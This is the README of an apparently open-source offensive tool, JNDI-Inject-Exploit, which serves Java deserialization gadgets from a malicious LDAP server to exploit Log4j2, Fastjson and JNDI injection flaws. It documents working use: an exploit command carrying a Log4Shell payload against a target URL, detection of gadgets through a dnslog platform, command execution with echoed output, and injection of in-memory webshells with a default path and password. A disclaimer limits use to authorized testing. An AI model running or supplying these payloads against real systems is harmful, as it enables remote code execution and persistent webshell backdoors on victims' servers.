# JNDI-Inject-Exploit

![JNDI-Inject-Exploit](https://socialify.git.ci/exp1orer/JNDI-Inject-Exploit/image?description=1&font=Inter&forks=1&issues=1&language=1&owner=1&pattern=Plus&stargazers=1&theme=Light)

## 免责声明

本工具仅面向**合法授权的企业安全测试**，如您需测试本工具的可用性请自行搭建靶机环境，在使用本工具进行检测时，您应确保该行为符合当地的法律法规，并且已经取得了足够的授权。**请勿对非授权目标进行扫描，如您在使用本工具的过程中存在任何非法行为，您需自行承担相应后果，作者将不承担任何法律及连带责任。**

## Introduce

> 本工具用于解决 Fastjson、log4j2、原生JNDI注入等场景中针对高版本JDK无法加载远程恶意类，通过LDAP服务器返回原生Java反序列化数据，受害者（客户端）在具备反序列化Gadget依赖的情况下可达到命令执行、代码执行、回显命令执行、无文件落地内存马注册等。
> 
> Solve the high version of JDK Bypass, like FastJson, Jackson, Log4j2, native JNDI injection vulnerabilities, and detect locally available deserialization gadgets to achieve command execution, echo command execution, and memory shell injection.

## ChangeLog

**0.3 Version**

- 新增Tomcat一句话内存马
- 新增Resin一句话内存马
- 新增漏洞环境

***

**v0.2 Version**

- 修复已知bug
- 支持从文件中读取HTTP请求

***

**v0.1 Version**

- Gadget探测
- 回显命令执行
- 内存马注入

## Support

- 本地gadget探测
- 回显命令执行
- Tomcat中间件注入冰蝎/哥斯拉流量加密Webshell内存马
- Tomcat/Resin 一句话内存马

## Test

漏洞环境请转至 v0.3 Version Releases处下载，运行 `springWithLog4j-1.0-SNAPSHOT.jar` 会在8190端口运行服务，访问首页的超链接后的id参数中存在 `Log4j2`漏洞。

![](https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20220119150756.png)

## Usage

```shell
java -jar JNDI-Inject-Exploit-[version]-all.jar 
```

无指定任何参数的情况下将显示帮助信息.

```
Usage:
java -jar JNDI-Inject-Exploit-0.1-all.jar [options]

Options:
    ip        LDAP Server IP（如VPS则指定公网IP）
    port      LDAP Server 监听端口，默认为1389
    url       目标URL，指定headers和body参数可发送完整HTTP请求
    file      指定HTTP请求数据包的文件，将根据该文件内容构造完整HTTP请求
    method    指定HTTP请求方法，默认为GET
    headers   指定HTTP请求头，以分号分隔多个请求头，以=分隔key,value
    body      指定HTTP请求体内容
    proxy     指定HTTP请求使用的代理（eg: 127.0.0.1:8080, 只支持Http/S）
```

**支持探测以下Gadget**

* BeanShell1
* CommonsBeanutils1
* CommonsBeanutils2
* CommonsCollections1
* CommonsCollections2
* CommonsCollections3
* CommonsCollections4
* CommonsCollections5
* CommonsCollections6
* CommonsCollections7
* CommonsCollections8
* CommonsCollections9
* CommonsCollections10
* CommonsCollectionsK1
* CommonsCollectionsK2
* CommonsCollectionsK3
* CommonsCollectionsK4
* Groovy1
* Weblogic2555
* Jdk7u21
* ROME
* Spring1
* Spring2

## Config

> 使用该工具必须在运行目录下新建 `config.properties`文件，配置DNSLOG平台信息，以下是示例配置文件。
>
> JNDI注入的漏洞场景为必须出网环境，因此使用Dnslog平台探测Gadget，sleep属性指定发送Gadget Payload后等待Dnslog平台的响应时间（具体数值根据网络环境及Dnslog平台自定义）。

```properties
# Dnslog平台名称（非必须）
Platform=ceye
# Dnslog平台查询API
Api=http://api.ceye.io/v1/records?token={token}&type=dns&filter={filter}
# Dnslog平台鉴权Token
Token=xxxx
# Dnslog平台顶级域名
Domain=xxxx.ceye.io
# 等待Dnslog平台响应时间（非必须，默认为5秒）
Sleep=10
# 开启LDAP请求日志打印
EnableLDAPLog=False
# 开启Http请求日志打印
EnableHttpLog=False
```

![](https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20211226143410.png)

## Example

**文件内容（如果是https的话需要在Host头中添加https://）**

![](https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20211229105716.png)

**从文件中读取HTTP请求进行漏洞利用**

![](https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20211229104932.png)

**LDAP查询的对象名称可为任意字符（示例为EvilObject），LDAPServer拦截客户端搜索结果获取查询名称，并根据该名称返回结果，因此查询任何名称均可运行。**

```
java -jar JNDI-Inject-Exploit-0.1-all.jar ip="192.168.0.104" url="http://192.168.0.118:8190/log?id=$%7bjndi:ldap://192.168.0.104:1389/EvilObject%7d"
```

**Gadget探测**

![](https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20211226142236.png)

**可利用Gadget信息，如名称中带有 `[TomcatEcho]` 等字样则表示该Gadget可利用且能够回显命令执行，如名称中带有 `TomcatBehinderFilter` 、`TomcatGodzillaFilter` 字样则表示支持在Tomcat中间件中注入冰蝎内存马或哥斯拉内存马（支持该功能不代表一定能够注入成功）**

![](https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20211226142317.png)

**回显命令执行**

![](https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20211226142425.png)

**切换为普通命令执行gadget并执行 `calc` 命令**

![](https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20211226142509.png)

（目标受害机成功执行命令）

![img](https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20211217172927.png)

## MemoryShell

![](https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20211221123751.png)

**内存马注入 (默认内存马路径为/favicondemo.ico, 密码为pass1024), 回显Memory shell inject success表示注入成功. (NeoreGeorg不支持自定义密码, 默认密码为pass1024, 路径可自定义)**

![](https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20211221123915.png)

![](https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20211221124124.png)

## References

**本项目参考自以下优秀的开源项目:**

[wyzxxz/shiro_rce_tool: shiro 反序列 命令执行辅助检测工具](https://github.com/wyzxxz/shiro_rce_tool)

[feihong-cs/Java-Rce-Echo: Java RCE 回显测试代码](https://github.com/feihong-cs/Java-Rce-Echo)

[j1anFen/shiro_attack: shiro反序列化漏洞综合利用,包含（回显执行命令/注入内存马）](https://github.com/j1anFen/shiro_attack)


## Stargazers over time

[![Stargazers over time](https://starchart.cc/exp1orer/JNDI-Inject-Exploit.svg)](https://starchart.cc/exp1orer/JNDI-Inject-Exploit)
